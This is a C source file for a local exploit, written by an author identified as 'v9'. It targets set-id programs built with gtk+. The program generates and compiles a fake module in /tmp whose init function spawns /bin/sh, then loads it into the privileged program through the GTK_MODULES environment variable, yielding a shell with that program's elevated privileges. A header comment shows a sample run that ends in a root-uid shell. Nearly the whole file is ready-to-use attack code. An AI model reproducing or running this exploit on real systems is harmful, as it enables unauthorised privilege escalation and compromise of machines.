/* (*)gtk+[v*] local module exploit, by v9[v9@fakehalo.org].  this will give
   you the euid/egid of a set*id program using gtk+.  this exploit works via
   the GTK_MODULES environmental variable, by tricking gtk to execute arbitrary
   functions/commands with a bogus module. (using gtk_module_init())

   example(./xgtk):
-------------------------------------------------------------------------------
# ls -l /usr/bin/X11/gtk_program
-rwxr-sr-x   1 root     tty        437625 Oct 23  1999 /usr/bin/X11/gtk_program
# cc xgtk.c -o xgtk
# ./xgtk /usr/bin/X11/gtk_program :0.0
[ (*)gtk+[v*] local module exploit, by v9[v9@fakehalo.org]. ]
[ program: /usr/bin/X11/gtk_program(->/bin/sh), display: :0.0. ]

[*] making module for gtk+ to execute. (/tmp/gtkm.c)
[*] done, compiling module source file. (/tmp/gtkm.c->/tmp/gtkm.so)
[*] done, checking to see if the module comiled. (/tmp/gtkm.so)
[*] done, setting up the environment. (module&display)
[*] done, executing /usr/bin/X11/gtk_program, the module should load now.
[*] success, module loaded successfully.
[*] id stats: uid: 0, euid: 0, gid: 0, egid: 5.
[*] now executing: /bin/sh.
# 
-------------------------------------------------------------------------------

   note: this will require a valid display to exploit successfully.  also, i'm
         unsure of this for other gtk versions, i would just assume as much
         that this applies to it.
*/
#define GCCPATH "/usr/bin/gcc"  // path to gcc.
#define SRCFILE "/tmp/gtkm.c"   // source to the fake module to load.
#define MODEXEC "/tmp/gtkm.so"  // fake module to load.
#define DISPLAY ":0.0"          // default display. (also argv option)
#define EXECUTE "/bin/sh"       // execute this program.
#include <stdio.h>
#include <sys/stat.h>
int main(int argc,char **argv){
 char cmd[256],syscmd[256],display[256];
 struct stat mod1,mod2,mod3;
 FILE *source;
 fprintf(stderr,"[ (*)gtk+[v*] local module exploit, by v9[v9@fakehalo.org]. ]"
 "\n");
 if(argc>1){strncpy(cmd,argv[1],sizeof(cmd));}
 else{
  fprintf(stderr,"[!] syntax: %s </path/to/program> [display]\n",argv[0]);
  exit(-1);
 }
 if(argc>2){strncpy(display,argv[2],sizeof(display));}
 else{strncpy(display,DISPLAY,sizeof(display));}
 if(stat(cmd,&mod1)){
  fprintf(stderr,"[!] failed, %s doesn't seem to exist. (path needed)\n",cmd);
  exit(-1);
 }
 if(stat(GCCPATH,&mod2)){
  fprintf(stderr,"[!] failed, %s compiler doesn't seem to exist.\n",GCCPATH);
  exit(-1);
 }
 fprintf(stderr,"[ program: %s(->%s), display: %s. ]\n\n",cmd,EXECUTE,display);
 fprintf(stderr,"[*] making module for gtk+ to execute. (%s)\n",SRCFILE);
 unlink(SRCFILE);
 unlink(MODEXEC);
 source=fopen(SRCFILE,"w");
 fprintf(source,"#include <stdio.h>\n");
 fprintf(source,"void gtk_module_init(){\n");
 fprintf(source," unlink(\"%s\");\n",SRCFILE);
 fprintf(source," unlink(\"%s\");\n",MODEXEC);
 fprintf(source," fprintf(stderr,\"[*] success, module loaded successfully.\\n"
 "\");\n");
 fprintf(source," fprintf(stderr,\"[*] id stats: uid: %%d, euid: %%d, gid: %%d"
 ", egid: %%d.\\n\",getuid(),geteuid(),getgid(),getegid());\n",EXECUTE);
 fprintf(source," fprintf(stderr,\"[*] now executing: %s.\\n\");\n",EXECUTE);
 fprintf(source," execl(\"%s\",\"%s\",0);\n",EXECUTE,EXECUTE);
 fprintf(source,"}\n");
 fclose(source);
 fprintf(stderr,"[*] done, compiling module source file. (%s->%s)\n",SRCFILE,
 MODEXEC);
 snprintf(syscmd,sizeof(syscmd),"%s -shared -o %s %s 1>/dev/null 2>&1",GCCPATH,
 MODEXEC,SRCFILE);
 system(syscmd);
 fprintf(stderr,"[*] done, checking to see if the module comiled. (%s)\n",
 MODEXEC);
 if(stat(MODEXEC,&mod3)){
  fprintf(stderr,"[!] failed, %s was not compiled properly. (gcc failed)\n",
  MODEXEC);
  exit(-1);
 }
 fprintf(stderr,"[*] done, setting up the environment. (module&display)\n");
 setenv("GTK_MODULES",MODEXEC,1);
 setenv("DISPLAY",display,1);
 fprintf(stderr,"[*] done, executing %s, the module should load now.\n",cmd);
 if(execl(cmd,cmd,0)){
  fprintf(stderr,"[!] failed, %s did not execute properly.\n",cmd);
  unlink(SRCFILE);
  unlink(MODEXEC);
  exit(-1);
 }
}

